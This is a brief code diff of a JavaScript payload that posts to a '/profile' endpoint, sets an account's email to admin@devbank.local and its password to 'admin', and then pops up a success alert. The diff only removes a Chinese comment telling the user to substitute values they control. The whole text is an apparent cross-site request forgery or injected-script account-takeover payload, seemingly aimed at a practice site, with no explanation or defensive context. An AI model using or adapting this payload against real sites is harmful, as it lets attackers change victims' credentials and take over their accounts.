@@ -2,7 +2,7 @@
 fetch('/profile', {
   method: 'POST',
   headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  body: 'email=admin@devbank.local&password=admin'   // 改成你控制的值
+  body: 'email=admin@devbank.local&password=admin'
 })
   .then(() => alert('SUCCESS! Password has changed to "admin".\nAccount modification submitted to /profile'))
   .catch(() => alert('Request failed to send'));
